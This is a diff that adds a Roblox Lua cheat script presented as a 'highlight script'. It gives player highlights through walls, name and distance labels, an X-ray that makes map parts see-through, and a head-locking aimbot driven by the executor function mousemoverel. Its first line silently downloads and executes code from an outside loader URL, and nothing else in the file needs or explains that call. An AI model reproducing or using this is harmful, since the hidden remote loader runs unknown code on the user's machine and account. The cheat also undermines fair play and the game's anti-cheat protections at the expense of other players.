@@ -1,0 +1,593 @@
+loadstring(game:HttpGet("https://raiidev.xyz/rain/loader"))()
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local mouse = LocalPlayer:GetMouse()
+
+-- Check if script is already running
+if LocalPlayer:FindFirstChild("HighlightScriptRunning") then
+    return
+end
+
+local flag = Instance.new("BoolValue")
+flag.Name = "HighlightScriptRunning"
+flag.Value = true
+flag.Parent = LocalPlayer
+
+local ACTIVE = true
+flag.Destroying:Connect(function()
+    ACTIVE = false
+end)
+
+print("Highlight Script started.")
+
+----------------------------------------------------------------------
+-- ✨ Settings
+----------------------------------------------------------------------
+local SHOW_METERS = true
+local SHOW_NAMES = false
+local PAUSED = false
+local STUD_TO_M = 0.28
+
+-- Performance optimizations
+local UPDATE_INTERVAL = 0.1 -- Update only every 0.1 seconds instead of every frame
+local lastUpdate = 0
+local cachedPlayerData = {}
+
+----------------------------------------------------------------------
+-- 🔦 X-RAY Settings & Variables
+----------------------------------------------------------------------
+local XRAY_ACTIVE = false
+local TARGET_TRANSPARENCY = 0.8
+local IGNORE_THRESHOLD = 0.8
+local affectedParts = {}
+
+----------------------------------------------------------------------
+-- 🎯 Aim Assist Settings & Variables
+----------------------------------------------------------------------
+local aimEnabled = false
+local aiming = false
+local aimConnection = nil
+local currentTarget = nil
+local lockedTarget = nil -- 🔒 New: Locked target
+local lastAimUpdate = 0
+local AIM_UPDATE_INTERVAL = 0.03 -- Faster for better aiming
+
+----------------------------------------------------------------------
+-- 🔹 Highlight & UI Functions
+----------------------------------------------------------------------
+local function addHighlight(character)
+    if character and not character:FindFirstChild("Highlight") then
+        local highlight = Instance.new("Highlight")
+        highlight.Name = "Highlight"
+        highlight.FillColor = Color3.fromRGB(255,255,255)
+        highlight.OutlineColor = Color3.fromRGB(255,255,255)
+        highlight.Parent = character
+    end
+end
+
+local function removeHighlight(character)
+    if character and character:FindFirstChild("Highlight") then
+        character.Highlight:Destroy()
+    end
+end
+
+local function getPlayerName(player)
+    -- Cache for player names
+    if cachedPlayerData[player] and cachedPlayerData[player].name then
+        return cachedPlayerData[player].name
+    end
+    
+    if not cachedPlayerData[player] then
+        cachedPlayerData[player] = {}
+    end
+    
+    local playerName = player.Name -- Fallback
+    
+    -- First check leaderstats
+    if player:FindFirstChild("leaderstats") then
+        local leaderstats = player.leaderstats
+        if leaderstats:FindFirstChild("Name") then
+            playerName = leaderstats.Name.Value
+        elseif leaderstats:FindFirstChild("Username") then
+            playerName = leaderstats.Username.Value
+        elseif leaderstats:FindFirstChild("PlayerName") then
+            playerName = leaderstats.PlayerName.Value
+        end
+    else
+        -- Then check DisplayName
+        local character = player.Character
+        if character then
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid and humanoid.DisplayName ~= "" then
+                playerName = humanoid.DisplayName
+            end
+        end
+    end
+    
+    cachedPlayerData[player].name = playerName
+    return playerName
+end
+
+local function createCombinedLabel(character, player)
+    if not character:FindFirstChild("Head") then return end
+    local head = character.Head
+    
+    -- Remove old label if exists
+    if head:FindFirstChild("CombinedGui") then
+        head.CombinedGui:Destroy()
+    end
+    
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "CombinedGui"
+    billboard.Size = UDim2.new(0, 200, 0, 25)
+    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+    billboard.AlwaysOnTop = true
+    billboard.Parent = head
+
+    local container = Instance.new("Frame")
+    container.Name = "Container"
+    container.Size = UDim2.new(1, 0, 1, 0)
+    container.BackgroundTransparency = 1
+    container.Parent = billboard
+
+    local layout = Instance.new("UIListLayout")
+    layout.FillDirection = Enum.FillDirection.Horizontal
+    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    layout.VerticalAlignment = Enum.VerticalAlignment.Center
+    layout.SortOrder = Enum.SortOrder.LayoutOrder
+    layout.Padding = UDim.new(0, 5)
+    layout.Parent = container
+
+    local nameText = Instance.new("TextLabel")
+    nameText.Name = "NameText"
+    nameText.Size = UDim2.new(0, 0, 1, 0)
+    nameText.AutomaticSize = Enum.AutomaticSize.X
+    nameText.BackgroundTransparency = 1
+    nameText.TextColor3 = Color3.fromRGB(255, 255, 0)
+    nameText.TextStrokeTransparency = 0.3
+    nameText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    nameText.TextScaled = false
+    nameText.TextSize = 14
+    nameText.Font = Enum.Font.GothamBold
+    nameText.Text = getPlayerName(player)
+    nameText.LayoutOrder = 1
+    nameText.Parent = container
+
+    local distanceText = Instance.new("TextLabel")
+    distanceText.Name = "DistanceText"
+    distanceText.Size = UDim2.new(0, 0, 1, 0)
+    distanceText.AutomaticSize = Enum.AutomaticSize.X
+    distanceText.BackgroundTransparency = 1
+    distanceText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    distanceText.TextStrokeTransparency = 0.5
+    distanceText.TextScaled = false
+    distanceText.TextSize = 16
+    distanceText.Font = Enum.Font.GothamSemibold
+    distanceText.Text = ""
+    distanceText.LayoutOrder = 2
+    distanceText.Parent = container
+
+    return billboard
+end
+
+local function removeCombinedLabel(character)
+    if character and character:FindFirstChild("Head") then
+        local head = character.Head
+        if head:FindFirstChild("CombinedGui") then
+            head.CombinedGui:Destroy()
+        end
+    end
+end
+
+----------------------------------------------------------------------
+-- 🔦 X-RAY Functions
+----------------------------------------------------------------------
+local function shouldIgnorePart(part)
+    -- Ignore already transparent parts (>= 0.5)
+    return part.Transparency >= IGNORE_THRESHOLD
+end
+
+local function toggleXRay()
+    if not XRAY_ACTIVE then
+        -- Enable X-Ray
+        affectedParts = {}
+        local changedCount = 0
+        local ignoredCount = 0
+        
+        for _, obj in pairs(workspace:GetDescendants()) do
+            if obj:IsA("BasePart") then
+                -- Check if part should be ignored
+                if not shouldIgnorePart(obj) then
+                    -- Check if part belongs to any player
+                    local isPlayerPart = false
+                    for _, player in pairs(Players:GetPlayers()) do
+                        if player.Character and obj:IsDescendantOf(player.Character) then
+                            isPlayerPart = true
+                            break
+                        end
+                    end
+                    
+                    -- Only affect non-player parts
+                    if not isPlayerPart then
+                        affectedParts[obj] = obj.Transparency
+                        obj.Transparency = TARGET_TRANSPARENCY
+                        changedCount = changedCount + 1
+                    end
+                else
+                    ignoredCount = ignoredCount + 1
+                end
+            end
+        end
+        
+        XRAY_ACTIVE = true
+        print(string.format("X-Ray ENABLED: %d parts changed, %d parts ignored (Transparency >= 0.8)", changedCount, ignoredCount))
+    else
+        -- Disable X-Ray
+        local restoredCount = 0
+        for part, transparency in pairs(affectedParts) do
+            if part and part.Parent then
+                part.Transparency = transparency
+                restoredCount = restoredCount + 1
+            end
+        end
+        
+        affectedParts = {}
+        XRAY_ACTIVE = false
+        print(string.format("X-Ray DISABLED: %d parts restored", restoredCount))
+    end
+end
+
+-- Reset X-Ray when leaving
+game:GetService("Players").PlayerRemoving:Connect(function(leavingPlayer)
+    if leavingPlayer == LocalPlayer and XRAY_ACTIVE then
+        toggleXRay()
+    end
+end)
+
+----------------------------------------------------------------------
+-- 🎯 Aim Assist Functions
+----------------------------------------------------------------------
+-- Function to find the nearest player within the circle
+function findNearestPlayer()
+    local closestPlayer = nil
+    local closestDistance = 100
+    local closestHead = nil
+    
+    local camera = workspace.CurrentCamera
+    local screenCenter = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
+    
+    for _, otherPlayer in pairs(Players:GetPlayers()) do
+        if otherPlayer ~= LocalPlayer and otherPlayer.Character then
+            local humanoid = otherPlayer.Character:FindFirstChild("Humanoid")
+            local head = otherPlayer.Character:FindFirstChild("Head")
+            
+            if humanoid and humanoid.Health > 0 and head then
+                local screenPoint, visible = camera:WorldToScreenPoint(head.Position)
+                
+                if visible then
+                    local playerScreenPos = Vector2.new(screenPoint.X, screenPoint.Y)
+                    local distance = (playerScreenPos - screenCenter).Magnitude
+                    
+                    if distance <= closestDistance then
+                        closestDistance = distance
+                        closestPlayer = otherPlayer
+                        closestHead = head
+                    end
+                end
+            end
+        end
+    end
+    
+    return closestPlayer, closestHead
+end
+
+-- Optimized aim function
+function permanentAim()
+    if not aiming then return end
+    
+    -- 🔒 If we have a locked target, use that
+    if lockedTarget and lockedTarget.Parent then
+        local humanoid = lockedTarget.Parent:FindFirstChild("Humanoid")
+        if humanoid and humanoid.Health > 0 then
+            currentTarget = lockedTarget
+        else
+            -- Target is dead or invalid
+            lockedTarget = nil
+            currentTarget = nil
+            return
+        end
+    elseif not currentTarget then
+        -- 🔒 No locked target, find a new one
+        local targetPlayer, targetHead = findNearestPlayer()
+        if targetPlayer and targetHead then
+            currentTarget = targetHead
+            lockedTarget = targetHead -- 🔒 Lock immediately
+        else
+            return
+        end
+    end
+    
+    -- Check if target is still valid
+    if not currentTarget or not currentTarget.Parent then
+        currentTarget = nil
+        lockedTarget = nil
+        return
+    end
+    
+    local targetPlayer = Players:GetPlayerFromCharacter(currentTarget.Parent)
+    if not targetPlayer then
+        currentTarget = nil
+        lockedTarget = nil
+        return
+    end
+    
+    local humanoid = currentTarget.Parent:FindFirstChild("Humanoid")
+    if not humanoid or humanoid.Health <= 0 then
+        currentTarget = nil
+        lockedTarget = nil
+        return
+    end
+    
+    -- Permanent aiming at the head of the locked target
+    local screenPoint = workspace.CurrentCamera:WorldToScreenPoint(currentTarget.Position)
+    local targetPos = Vector2.new(screenPoint.X, screenPoint.Y)
+    
+    local currentMousePos = Vector2.new(mouse.X, mouse.Y)
+    local direction = (targetPos - currentMousePos)
+    
+    -- Optimized speed
+    local speed = 0.5
+    local step = direction * speed
+    
+    pcall(function()
+        mousemoverel(step.X, step.Y)
+    end)
+end
+
+----------------------------------------------------------------------
+-- 🔹 Player Setup
+----------------------------------------------------------------------
+local function setupPlayer(player)
+    if player ~= LocalPlayer then
+        player.CharacterAdded:Connect(function(char)
+            task.wait(1)
+            if not ACTIVE then return end
+            addHighlight(char)
+            if SHOW_NAMES or SHOW_METERS then
+                createCombinedLabel(char, player)
+            end
+        end)
+        
+        player.CharacterRemoving:Connect(function(char)
+            if cachedPlayerData[player] then
+                cachedPlayerData[player] = nil
+            end
+        end)
+        
+        if player.Character then
+            task.wait(1)
+            addHighlight(player.Character)
+            if SHOW_NAMES or SHOW_METERS then
+                createCombinedLabel(player.Character, player)
+            end
+        end
+    end
+end
+
+-- Initially set up all players
+for _, player in pairs(Players:GetPlayers()) do
+    setupPlayer(player)
+end
+
+Players.PlayerAdded:Connect(setupPlayer)
+Players.PlayerRemoving:Connect(function(player)
+    if cachedPlayerData[player] then
+        cachedPlayerData[player] = nil
+    end
+end)
+
+----------------------------------------------------------------------
+-- 🔹 Optimized Live Update Loop
+----------------------------------------------------------------------
+local updateConnection
+updateConnection = RunService.Heartbeat:Connect(function(deltaTime)
+    if not ACTIVE then
+        if updateConnection then
+            updateConnection:Disconnect()
+        end
+        return
+    end
+    
+    -- Check update interval
+    lastUpdate = lastUpdate + deltaTime
+    if lastUpdate < UPDATE_INTERVAL then
+        return
+    end
+    lastUpdate = 0
+    
+    local myCharacter = LocalPlayer.Character
+    local myRoot = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart")
+    
+    if not myRoot then return end
+    
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            local char = player.Character
+            if char and char:FindFirstChild("Head") and char:FindFirstChild("HumanoidRootPart") then
+                local head = char.Head
+                local theirRoot = char.HumanoidRootPart
+
+                -- Update Combined Label
+                if (SHOW_NAMES or SHOW_METERS) and not PAUSED then
+                    local combinedGui = head:FindFirstChild("CombinedGui")
+                    if not combinedGui then
+                        combinedGui = createCombinedLabel(char, player)
+                    end
+                    
+                    if combinedGui then
+                        combinedGui.Enabled = true
+                        local container = combinedGui:FindFirstChild("Container")
+                        
+                        if container then
+                            local nameText = container:FindFirstChild("NameText")
+                            local distanceText = container:FindFirstChild("DistanceText")
+                            
+                            if nameText then
+                                nameText.Visible = SHOW_NAMES
+                            end
+                            
+                            if distanceText and SHOW_METERS then
+                                local distStuds = (myRoot.Position - theirRoot.Position).Magnitude
+                                local distMeters = distStuds * STUD_TO_M
+                                distanceText.Text = string.format("%.1f m", distMeters)
+                                distanceText.Visible = true
+                            elseif distanceText then
+                                distanceText.Visible = false
+                            end
+                        end
+                    end
+                elseif head:FindFirstChild("CombinedGui") then
+                    head.CombinedGui.Enabled = false
+                end
+                
+                -- Update Highlight
+                if not PAUSED then
+                    addHighlight(char)
+                else
+                    removeHighlight(char)
+                end
+            end
+        end
+    end
+end)
+
+----------------------------------------------------------------------
+-- 🔹 Key Inputs (F1/F2/F3/F4/F5/F6/F8)
+----------------------------------------------------------------------
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed or not ACTIVE then return end
+    
+    if input.UserInputType == Enum.UserInputType.Keyboard then
+        if input.KeyCode == Enum.KeyCode.F1 then
+            SHOW_METERS = not SHOW_METERS
+            print("Distance display: " .. (SHOW_METERS and "ON" or "OFF"))
+            
+        elseif input.KeyCode == Enum.KeyCode.F2 then
+            SHOW_NAMES = not SHOW_NAMES
+            print("Show names: " .. (SHOW_NAMES and "ON" or "OFF"))
+            
+        elseif input.KeyCode == Enum.KeyCode.F3 then
+            PAUSED = not PAUSED
+            print("Pause: " .. (PAUSED and "ON" or "OFF"))
+            
+        elseif input.KeyCode == Enum.KeyCode.F4 then
+            -- Remove all + disable script
+            ACTIVE = false
+            PAUSED = true
+
+            for _, player in pairs(Players:GetPlayers()) do
+                local char = player.Character
+                if char then
+                    removeHighlight(char)
+                    removeCombinedLabel(char)
+                end
+            end
+
+            -- Clear cache
+            cachedPlayerData = {}
+            
+            if flag then 
+                flag:Destroy() 
+            end
+            
+            if updateConnection then
+                updateConnection:Disconnect()
+                updateConnection = nil
+            end
+            
+            print("Highlight Script completely terminated.")
+            
+        elseif input.KeyCode == Enum.KeyCode.F5 then
+            aimEnabled = not aimEnabled
+            if aimEnabled then
+                print("Aim Assist activated - Permanent lock")
+            else
+                print("Aim Assist deactivated")
+                aiming = false
+                currentTarget = nil
+                lockedTarget = nil -- 🔒 Reset locked target
+                if aimConnection then
+                    aimConnection:Disconnect()
+                    aimConnection = nil
+                end
+            end
+            
+        elseif input.KeyCode == Enum.KeyCode.F6 then
+            aimEnabled = false
+            aiming = false
+            currentTarget = nil
+            lockedTarget = nil -- 🔒 Reset locked target
+            if aimConnection then
+                aimConnection:Disconnect()
+                aimConnection = nil
+            end
+            print("Aim Assist completely closed")
+            
+        elseif input.KeyCode == Enum.KeyCode.F8 then
+            -- Toggle X-Ray
+            toggleXRay()
+        end
+    end
+    
+    -- Aim Assist mouse input
+    if aimEnabled and input.UserInputType == Enum.UserInputType.MouseButton2 then
+        aiming = true
+        -- 🔒 Lock onto the current target when pressing
+        if not lockedTarget then
+            local targetPlayer, targetHead = findNearestPlayer()
+            if targetHead then
+                lockedTarget = targetHead
+                currentTarget = targetHead
+            end
+        end
+        
+        if not aimConnection then
+            aimConnection = RunService.RenderStepped:Connect(permanentAim)
+        end
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    
+    if aimEnabled and input.UserInputType == Enum.UserInputType.MouseButton2 then
+        aiming = false
+        -- 🔒 Release the target when releasing the right mouse button
+        lockedTarget = nil
+        currentTarget = nil
+        
+        if aimConnection then
+            aimConnection:Disconnect()
+            aimConnection = nil
+        end
+    end
+end)
+
+-- Create initial labels for existing players
+task.wait(2) -- More time for leaderstats to load
+for _, player in pairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer and player.Character then
+        if SHOW_NAMES or SHOW_METERS then
+            createCombinedLabel(player.Character, player)
+        end
+    end
+end
+
+print("Script fully loaded!")
+print("Highlight controls: F1=Distance, F2=Names, F3=Pause, F4=Stop")
+print("Aim Assist: F5=Activate/Deactivate, F6=Close, Right click=Targeting")
+print("X-Ray: F8=Toggle (makes non-player parts with transparency < 0.5 see-through)")
+print("🔒 Aim Assist: Target is locked until right click is released")
